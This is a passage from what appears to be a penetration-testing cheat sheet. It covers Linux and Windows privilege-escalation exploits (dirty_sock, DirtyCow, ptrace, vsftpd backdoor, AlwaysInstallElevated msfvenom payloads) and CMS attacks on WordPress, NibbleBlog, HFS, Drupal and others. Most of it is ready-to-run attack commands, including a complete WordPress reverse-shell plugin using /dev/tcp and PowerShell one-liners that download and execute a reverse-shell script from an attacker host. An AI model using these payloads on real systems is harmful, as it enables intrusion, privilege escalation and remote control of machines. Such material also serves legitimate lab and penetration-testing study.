wget https://github.com/initstring/dirty_sock/archive/master.zip

# Usage
unzip
cd dirty_sock
python3 dirty_sockv2.py

# Then
su dirty_sock
	* dirty_sock
```

### ChrootKit

```bash
- If you found chrootkit run in background then you can try this

# Steps
echo "cp /bin/bash /tmp/bash;chmod 4777 /tmp/bash" > /tmp/update
/tmp/bash -p
```

### IIS 6.0 (CVE-2017-7269)

```bash
# Download
wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell -O exploit.py

# Usage
python exploit.py 10.10.10.14 80 10.10.14.23 443
```

### AlwaysInstall Elevated

```bash
# Payload
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=9002 –f  msi > install.msi
msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=9002 –f  msi > install.msi
msiexec /quiet /qn /i  install.msi
```

### Ptrace

```bash
# Download
wget https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c

# Compile
gcc -Wall --std=gnu99 -s poc.c -o ptrace_traceme_root

# Usage
./ptrace_traceme_root
```

### FTP Backdoor Command Execution

```bash
# Download
wget https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py

# Usage
└─▶ python3 vsftpd_234_exploit.py 10.150.150.12 21 whoami
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
[+] Connected to backdoor on 10.150.150.12:6200
[+] Response:
root
```

### Shadow Writable

```bash
- Generate weak password in http://sha512crypt.pw/

# Example - password
$6$Zwdp3uo2Hg1HUvlc$wYEAwd5o9C5xQ1yX97izpRp/IhH4Dk1BzgprmQmK2P9/GnYTCIxzpF63/jelcdi6FjSIXxbirfn8o2gR1rHZq0

- replace in root hash

# Commands
su root
```

### OpenSMPTD < 6 (Local Privesc)

```bash
# Save as exploit.pl
https://www.exploit-db.com/exploits/48051

# Usage
perl exploit.pl LPE #local
perl exploit.pl RCE 10.0.0.162 10.0.0.24 example.org
```

### PHP Info + LFI

```bash
# Downloads
https://raw.githubusercontent.com/VineshChauhan24/LFI-phpinfo-RCE/master/exploit.py

# References

```

### DirtyCow

```bash
# Download

# Usage
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password
```

### Ubuntu

```bash
# Kernel 
# < 2.6.37 
- https://www.exploit-db.com/exploits/15704 

# < 3.10
- https://www.exploit-db.com/exploits/18411
	* https://github.com/lucyoa/kernel-exploits/tree/master/memodipper

# < 3.19
- https://www.exploit-db.com/exploits/37292

# < 5.11
- https://github.com/briskets/CVE-2021-3493
```

### SambaCry RCE: CVE-2017–7494

```bash
# Vulnerable Versions
- Within versions 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14.

# Downloads
https://github.com/joxeankoret/CVE-2017-7494

# Commands (Metasploit)
use linux/samba/is_known_pipename
set SMB::AlwaysEncrypt false
set SMB::ProtocolVersion 1
set rhosts 10.10.10.10

# Commands Manual


# References
- https://bond-o.medium.com/sambacry-rce-cve-2017-7494-41c3dcc0b7ae
```

# E. CMS/Web

### Wordpress

```bash
# Wpscan
wpscan --url https://10.10.10.10/blog/ -e u,vp --disable-tls-checks
wpscan --url http://10.10.10.10/blog/ -e u --passwords rockyou.txt

# Location
/wp-content/plugins/

# Default Credentials 
admin:password 
wordpress:wordpress 
root:toor

# Reverse Shell
## Plugins
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: H0j3n
* Author URI: https://h0j3n.blog/
*/

exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.10.10/443 0>&1'");
?>

- save as shell.php
- zip shell.zip shell.php

# Plugins Vulnerable
##===CVE-2014-2383===
- /wp-content/plugins/post-pdf-export/images/download-icon.png
- /dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
- https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
```

### NibbleBlog

```bash
# Download Exploit Here
wget https://raw.githubusercontent.com/TheRealHetfield/exploits/master/nibbleBlog_fileUpload.py

# Commands
#==Manual==
# Step 1:
- Go to http://10.10.10.10/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
- Upload php reverse shell
# Step 2
- Listening
- Go to http://10.10.10.10/nibbleblog/content/private/plugins/my_image/image.php
```

### HTTPFileServer

```bash
# Links
- https://www.exploit-db.com/exploits/49125
	* python3 exploit3.py 10.10.10.10 80 "c:\windows\system32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.11/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.11 -Port 443"
	* python3 exploit3.py 10.10.10.10 80 "C:\Users\kostas\Desktop\nc.exe -e cmd.exe 10.10.10.11 443"
- https://www.exploit-db.com/exploits/39161
	* Change lhost,lport
- https://www.exploit-db.com/exploits/49584
	* Change lhost,lport,rhost,rport (Depends windows version)
```

### Drupal

```bash
# Scanner
## drupwn
git clone https://github.com/immunIT/drupwn.git
python3 -m pip install -r requirements.txt
./drupwn --target  http://10.10.10.9/  --mode enum

##droopescan
droopescan scan drupal -u http://10.10.10.9/

# 7.x Exploit
https://www.exploit-db.com/exploits/41564
searchsploit -x php/webapps/44449.rb > exploit.rb
	- ruby exploit.rb http://10.10.10.10./ --verbose
```

### Elastix

```bash
# Download
searchsploit -x php/webapps/18650.py > output.py

# Usage
- Change lport
- Run

# Lfi
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

### CMS Made Simple

```bash
# SQL Injection
https://www.exploit-db.com/exploits/46635

# Usage
python exploit.py -u http://10.10.10.10/writeup
```


### Umbraco

```bash
# Download
git clone https://github.com/noraj/Umbraco-RCE.git

# Usage
python exploit.py -u 'user@email.com' -p 'password' -i http://10.10.10.10 -c powershell.exe -a 'whoami'
```

### ThinVNC

```bash
# File Traversal - Better use burpsuite
- http://IP:PORT/<Anything>/../../ThinVnc.ini
```


### Voting System

```bash
# File Upload RCE
https://www.exploit-db.com/exploits/49445

# References
https://www.sourcecodester.com/php/12306/voting-system-using-php.html
```

### Osticket

```bash
# File location
/var/www/osticket/upload/include/ost_config.php
```

### SharePoints

```bash
# References
https://hackingprofessional.github.io/HTB/Hacking-a-sharepoint-website/
https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
https://www.crummie5.club/the-lone-sharepoint/
https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/

```

# F. Reverse Shell

### PowerShell

```powershell
# ConPtyShell (Interactive Powershell)

```

# References
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://book.hacktricks.xyz/
- https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
- https://zer1t0.gitlab.io/posts/attacking_ad/